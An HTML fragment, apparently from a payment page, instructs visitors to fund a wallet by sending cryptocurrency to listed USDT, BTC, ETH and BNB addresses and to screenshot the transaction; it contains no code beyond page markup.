</head>
<body>
    <div class="background"></div>
    <div class="overlay">
        <div class="overlay-content">
            
            
            <div class="form">
            <h1>INSTRUCTIONS</h1>
            <div class="badge-container">
                <div class="badge">1</div>
                <p>Copy your prefered cryptocurrency wallet address below</p>
                <b>USDT address:</b>
                <p class="walletAddress" style="margin-top: .2rem;">0x86852d65975d296f9b2244675fd1dbfed1f7de24</p>
                <b>BTC address:</b>
                <p class="walletAddress" style="margin-top: .2rem;">1HxR4kv7iHDG8HvzMNN9te9rTKqoL7gmRs</p>
                <b>ETH address:</b>
                <p class="walletAddress" style="margin-top: .2rem;">0x86852d65975d296f9b2244675fd1dbfed1f7de24</p>
                <b>BNB address:</b>
                <p class="walletAddress" style="margin-top: .2rem;">0x86852d65975d296f9b2244675fd1dbfed1f7de24</p>
            </div>
           
            <div class="badge-container">
                <div class="badge">2</div>
                <p>Make a transfer of the cryptocurrency to the wallet. Note: only transfer a cryptocurrency to the matching wallet (e.g do not transfer USDT crypto to a BTC wallet).
                    The amount you transfer should be equal to the amount you wish to Fund
                    your wallet with. take a screenshot of the transaction. 
